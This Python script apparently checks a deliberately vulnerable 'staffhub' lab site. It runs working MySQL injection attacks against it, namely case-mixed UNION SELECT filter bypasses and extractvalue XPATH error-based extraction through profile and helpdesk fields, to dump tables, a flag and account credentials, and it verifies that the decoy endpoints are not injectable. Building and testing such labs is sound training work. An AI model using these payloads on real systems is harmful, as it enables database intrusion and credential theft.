import html
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/")
P = BASE + "/staff"
FLAG = re.compile(r"FLAG\{staffhub_[a-z_]+\}")
VER = re.compile(r"\b8\.\d+\.\d+\b")
HINTS = re.compile(r"\b(sql|inject\w*|vulnerable|flag|lab|hint|debug|mysql|mssql)\b", re.I)


def step(name, ok):
    print(f"{name}: {'PASS' if ok else 'FAIL'}")


def profile(i):
    return requests.get(P + "/profile", params={"id": i}, timeout=15)


def h1(text):
    m = re.search(r"<h1>(.*?)</h1>", text, re.S)
    return html.unescape(m.group(1)) if m else ""


def union(expr, tail=""):
    r = profile(f"-1 UnIoN SeLeCt 1,{expr},3,4,5,6,7,8 {tail}")
    return h1(r.text)


def xpath_chunks(send, expr):
    """Pull a long string 31 chars at a time out of XPATH error text via the supplied sender."""
    out, off = "", 1
    while off < 400:
        txt = send(f"substr(({expr}),{off},31)")
        m = re.search(r"XPATH syntax error: &#39;~(.*?)&#39;", txt)
        if not m or not m.group(1):
            break
        out += html.unescape(m.group(1))
        off += 31
    return out


def send_profile(piece):
    return profile(f"1 and extractvalue(1,concat(0x7e,{piece}))").text


def send_ticket(field):
    def f(piece):
        data = {"name": "n", "category": "Other", "subject": "s", "message": "m"}
        data[field] = f"' or extractvalue(1,concat(0x7e,{piece})) or '"
        return requests.post(P + "/helpdesk", data=data, timeout=15).text
    return f


def crawl():
    seen, todo, pages = set(), ["/staff/"], {}
    while todo and len(seen) < 150:
        u = todo.pop()
        if u in seen:
            continue
        seen.add(u)
        r = requests.get(BASE + u, timeout=15)
        pages[u] = r.text
        for h in re.findall(r'href="([^"#]+)"', r.text):
            h = html.unescape(h)
            if h.startswith("/staff") and h not in seen:
                todo.append(h)
    return pages


def main():
    # ---- site shape: public only, no auth surface, no hints
    pages = crawl()
    blob = "\n".join(pages.values())
    step("site-crawl", len(pages) >= 20)
    step("site-no-auth-forms", 'type="password"' not in blob and not re.search(r"sign.?in|log.?in|sign.?up|register", blob, re.I))
    step("site-no-hint-words", not HINTS.search(blob))
    step("site-no-comments", "<!--" not in blob)
    step("site-robots-sitemap-absent", requests.get(BASE + "/staff/robots.txt", timeout=15).status_code == 404
         and requests.get(BASE + "/staff/sitemap.xml", timeout=15).status_code == 404)
    step("site-visible-endpoints-linked", all(any(x in blob for x in ("/staff" + e,)) for e in
         ("/directory?dept=", "/search", "/news?id=", "/helpdesk/track", "/profile?id=")))

    # ---- profile: filter behaviour
    step("profile-quote-error-visible", "Could not load profile" in profile("1'").text)
    step("profile-filter-blocks-lowercase", "Invalid employee reference" in profile("-1 union select 1").text)
    step("profile-filter-blocks-comment", "Invalid employee reference" in profile("1 --").text)

    # ---- profile: UNION (case bypass)
    step("profile-union-version", bool(VER.search(union("version()"))))
    t = union("group_concat(table_name)", "FrOm INFORMATION_SCHEMA.tables WHERE table_schema=database()")
    step("profile-union-tables", "it_secrets" in t and "employees" in t and "tickets" in t)
    t = union("group_concat(column_name)", "FrOm INFORMATION_SCHEMA.columns WHERE table_schema=database() AND table_name=0x69745f73656372657473")
    step("profile-union-columns", "secret" in t and "system_name" in t)
    step("profile-union-dump-flag", bool(FLAG.search(union("group_concat(secret)", "FrOm it_secrets"))))
    t = union("group_concat(username,0x3a,password)", "FrOm accounts")
    step("profile-union-dump-rows", "hr.admin:" in t)

    # ---- profile: error-based (case bypass)
    v = xpath_chunks(send_profile, "SeLeCt version()")
    step("profile-error-version", bool(VER.search(v)))
    t = xpath_chunks(send_profile, "SeLeCt group_concat(table_name) FrOm INFORMATION_SCHEMA.tables WHERE table_schema=database()")
    step("profile-error-tables", "it_secrets" in t and "payroll_archive" in t)
    t = xpath_chunks(send_profile, "SeLeCt group_concat(column_name) FrOm INFORMATION_SCHEMA.columns WHERE table_schema=database() AND table_name=0x69745f73656372657473")
    step("profile-error-columns", "secret" in t and "system_name" in t)
    t = xpath_chunks(send_profile, "SeLeCt group_concat(secret) FrOm it_secrets")
    step("profile-error-dump-flag", bool(FLAG.search(t)))

    # ---- helpdesk INSERT: error-based, each free-text field
    for field in ("name", "subject", "message"):
        v = xpath_chunks(send_ticket(field), "select version()")
        step(f"helpdesk-{field}-version", bool(VER.search(v)))
    f = send_ticket("subject")
    t = xpath_chunks(f, "select group_concat(table_name) from information_schema.tables where table_schema=database()")
    step("helpdesk-tables", "it_secrets" in t and "employees" in t)
    t = xpath_chunks(f, "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='it_secrets'")
    step("helpdesk-columns", "secret" in t and "system_name" in t)
    t = xpath_chunks(f, "select group_concat(secret) from it_secrets")
    step("helpdesk-dump-flag", bool(FLAG.search(t)))
    t = xpath_chunks(f, "select group_concat(username,0x3a,password) from accounts")
    step("helpdesk-dump-rows", "hr.admin:" in t)
    r = requests.post(P + "/helpdesk", data={"name": "Pat", "category": "Other", "subject": "Normal request", "message": "Hello"}, timeout=15)
    step("helpdesk-normal-submit", "Request received" in r.text)
    r = requests.post(P + "/helpdesk", data={"name": "Pat", "category": "Other' or 1=1 or '", "subject": "x", "message": "y"}, timeout=15)
    step("helpdesk-category-validated", "Request received" in r.text and "syntax" not in r.text)

    # ---- decoys must not be injectable
    total = requests.get(P + "/directory", timeout=15).text.count("/profile?id=")
    step("directory-baseline", total >= 10)
    t = requests.get(P + "/directory", params={"dept": "Sales' OR '1'='1"}, timeout=15).text
    step("decoy-directory-dept", "No employees found" in t and "syntax" not in t)
    t = requests.get(P + "/directory", params={"dept": "x' UNION SELECT 1,version(),3,4,5,6#"}, timeout=15).text
    step("decoy-directory-union", not VER.search(t))
    t = requests.get(P + "/directory", params={"page": "1'"}, timeout=15).text
    step("decoy-directory-page", "Invalid page number" in t and "syntax" not in t)
    t = requests.get(P + "/search", params={"q": "a' or '1'='1"}, timeout=15).text
    step("decoy-search-validation", "may only contain" in t)
    t = requests.get(P + "/search", params={"q": "x%' OR 1=1 OR '%"}, timeout=15).text
    step("decoy-search-no-bypass", "may only contain" in t and "<table>" not in t)
    t = requests.get(P + "/helpdesk/track", params={"ref": "x' OR '1'='1"}, timeout=15).text
    step("decoy-track", "No request found" in t and "syntax" not in t)
    t = requests.get(P + "/helpdesk/track", params={"ref": "x' UNION SELECT version(),2,3,4,5#"}, timeout=15).text
    step("decoy-track-union", not VER.search(t) and "No request found" in t)
    t = requests.get(P + "/news", params={"id": "1'"}, timeout=15).text
    step("decoy-news-quote", "could not be found" in t and "syntax" not in t)
    t = requests.get(P + "/news", params={"id": "1 or 1=1"}, timeout=15).text
    step("decoy-news-numeric", "could not be found" in t and "<table>" not in t)
    t = requests.get(P + "/news", params={"id": "0 UNION SELECT 1,version(),3,4,5"}, timeout=15).text
    step("decoy-news-union", not VER.search(t))

    # ---- dead ends
    step("deadend-admin-403", requests.get(P + "/admin/", timeout=15).status_code == 403
         and requests.get(P + "/admin", timeout=15).status_code == 403)
    step("deadend-backup-403", requests.get(P + "/backup/", timeout=15).status_code == 403)
    r = requests.post(P + "/admin/login", data={"username": "admin", "password": "x"}, timeout=15)
    step("deadend-no-login-endpoint", r.status_code in (404, 405))
    step("deadend-handbook-static", "no longer maintained" in requests.get(P + "/handbook", timeout=15).text)


main()
